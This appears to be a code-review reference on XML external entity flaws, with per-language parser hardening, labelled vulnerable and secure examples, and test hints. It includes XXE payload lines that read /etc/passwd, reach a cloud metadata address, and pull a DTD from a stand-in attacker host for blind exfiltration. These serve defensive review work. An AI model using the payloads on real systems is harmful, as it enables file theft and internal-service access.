---
slug: xxe
title_en: XML external entity
title_tr: XML external entity (XXE)
cwe: CWE-611, CWE-776
owasp: A05:2021
sources: sast-skills, codecrucible, open-code-review
---

## Summary

An XML parser reads attacker-controlled XML with external entity resolution or DTD processing left on. The attacker then reads local files, reaches internal services (SSRF via XXE), or exhausts memory with entity expansion. Many parsers resolve external entities by default, so the finding is often the absence of hardening, not an extra opt-in.

## What it is

- **External entity read.** `<!ENTITY xxe SYSTEM "file:///etc/passwd">` resolved by the parser returns file contents in the output.
- **SSRF via XXE.** `<!ENTITY xxe SYSTEM "http://169.254.169.254/...">` makes the server fetch an internal URL.
- **Parameter entity / blind XXE.** `<!ENTITY % p SYSTEM "http://attacker/evil.dtd"> %p;` exfiltrates data out of band when the response is not returned.
- **Entity expansion DoS (CWE-776).** Nested entities (Billion Laughs) expand to exhaust memory.
- **XInclude.** `xi:include` reads a local file without a classic `ENTITY` declaration when XInclude is on.
- **Unhardened defaults.** Java DOM/SAX/StAX, PHP SimpleXML/DOMDocument, and lxml resolve external entities unless the code disables them.

## What it is not

- XML data rendered as HTML without escaping → `xss`.
- A server HTTP request from a user URL with no XML parser → `ssrf`.
- Deserializing attacker bytes through an object deserializer → `deserialization`.
- Parsing fully server-controlled XML (a bundled config, a migration file) with no user input → not exploitable.
- A parser that is safe by default and not re-enabled (defusedxml, Go `encoding/xml`, Nokogiri default): not this class.

## Where to look

Flag an XML parse call that has no adjacent hardening (DTD disabled, external entities disabled). Then trace whether the XML comes from a user.

### Python
- `xml.etree.ElementTree.parse`/`fromstring`, `xml.dom.minidom`, `xml.sax`, `lxml.etree.parse`/`fromstring`/`XML`.
- Safe: `import defusedxml.ElementTree`; lxml `XMLParser(resolve_entities=False, no_network=True, load_dtd=False)`.

### Java/Kotlin
- `DocumentBuilderFactory`, `SAXParserFactory`, `XMLInputFactory`, `TransformerFactory`, `SchemaFactory`, `Unmarshaller` (JAXB) built with no hardening.
- Safe: `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`, `FEATURE_SECURE_PROCESSING`, `XMLInputFactory.SUPPORT_DTD=false`, `Transformer` `ACCESS_EXTERNAL_DTD=""`.

### PHP
- `simplexml_load_string`, `DOMDocument::loadXML`, `xml_parse`.
- Safe: `libxml_disable_entity_loader(true)` (PHP 7.x) or the `LIBXML_NONET` flag. Note: `LIBXML_NOENT` expands entities; it is not a protection.

### Go
- Standard `encoding/xml` does not resolve external entities. Flag a third-party library (for example `beevik/etree`) only when it enables entity or network resolution.

### C#/.NET
- `XmlDocument.Load`, `XmlTextReader`, `XDocument.Load`, `XmlReader.Create` with no settings.
- Safe: `XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit, XmlResolver = null }`; `XmlDocument.XmlResolver = null`.

### Node.js
- `libxmljs.parseXmlString`, `node-expat`. `xml2js` does not resolve external entities by default. Prefer a non-libxml2 parser for untrusted XML.

### Ruby
- `Nokogiri::XML(x) { |c| c.noent }` enables entity substitution. REXML has an expansion-DoS history. Nokogiri default (no options) is safe.

## Safe patterns

- Disable DTD processing entirely. It is the strongest control and removes external entities and expansion at once.
- Use a safe-by-default parser: Python `defusedxml`, Go `encoding/xml`, Ruby Nokogiri default.
- Set the parser-specific flags: lxml `resolve_entities=False, no_network=True`; Java `disallow-doctype-decl=true`; .NET `DtdProcessing.Prohibit` and `XmlResolver = null`.
- Turn off XInclude when it is not needed.

## Weak mitigations

- `LIBXML_NOENT` in PHP. It expands entities; it does not block them.
- Only disabling external general entities while DTD and parameter entities stay on. Blind XXE through a parameter entity remains.
- A WAF rule that looks for `<!ENTITY`. Encoding and alternate placement get past it.
- Validating the XML against a schema. It does not stop entity resolution.

## Verification checklist

- **attacker_control:** Name the entry point (request body, file upload, inter-service message) and show the XML reaches the parser.
- **privilege_boundary:** State the gain: read a local file, reach an internal host, or exhaust memory. A reflected response means direct file read; a blind path means out-of-band exfiltration.
- **unmitigated:** Confirm the parser does not disable DTD or external entities on this path. Quote the hardening line to refute. A default-safe parser (defusedxml, Go stdlib) refutes.
- Check whether the response returns the parsed content (reflected) or not (blind). Blind XXE is still a finding.

## Examples

### Python (lxml)
```python
# Vulnerable: lxml resolves external entities by default
tree = etree.fromstring(request.data)

# Secure: disable entities, DTD load, and network
parser = etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)
tree = etree.fromstring(request.data, parser)
```

### Java/Kotlin (DocumentBuilder)
```java
// Vulnerable: default factory resolves external entities
DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();
Document doc = f.newDocumentBuilder().parse(new InputSource(new StringReader(xml)));

// Secure: disable DTD processing
DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();
f.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
Document doc = f.newDocumentBuilder().parse(new InputSource(new StringReader(xml)));
```

### PHP (DOMDocument)
```php
// Vulnerable: external entities enabled by default
$doc = new DOMDocument();
$doc->loadXML($xml);

// Secure (PHP 7.x): block the entity loader and network
libxml_disable_entity_loader(true);
$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NONET);
```

## Dynamic test hints

- Use a local build only. Point every entity at a local, controlled target. Never test a real system.
- File read probe on a local app:
  `POST` with `Content-Type: application/xml` and body
  `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>`.
  Look for the file content in the response.
- Blind probe: point a parameter entity at a local HTTP listener you control and watch for the callback.
- Do not point an entity at a cloud metadata endpoint or any real internal host.

## False positive traps

- The parser disables DTD or external entities explicitly. Quote the config line.
- The library version defaults to safe and no code re-enables entities (defusedxml, Go `encoding/xml`, Nokogiri default).
- The XML is a static server-side file or generated from trusted data with no attacker bytes.
- The parser is a streaming parser that does not resolve entities.
- PHP `LIBXML_NOENT` is present but mistaken for protection. It is not; keep the finding unless `libxml_disable_entity_loader(true)` or `LIBXML_NONET` is also there.

## Sources

Condensed and rewritten from the local copies under `third_party/`.

- `utkusen/sast-skills@db52227: sast-files/.claude/skills/sast-xxe/SKILL.md` (MIT, Utku Sen): the parser list and hardening per language, the defusedxml/Nokogiri safe defaults, the `LIBXML_NOENT` trap, XInclude note, per-stack examples.
- `block/codecrucible@b5c8086: prompts/default/cwe_deep_analysis.yaml` (CWE-611), `prompts/default/analysis_sections.yaml` (XML), `prompts/exploit-proof-web-java/cwe_deep_analysis.yaml` (CWE-611), `prompts/core/audit_families.yaml` (parsing family) (Apache-2.0, Block): the "name the parser and the flag" method, default behavior, reflected vs blind, false positive indicators.
- `alibaba/open-code-review@11ac6d4: internal/config/rules/rule_docs/java.md`, `php.md` (Apache-2.0, alibaba/open-code-review contributors): the untrusted-XML parser-config boundary.
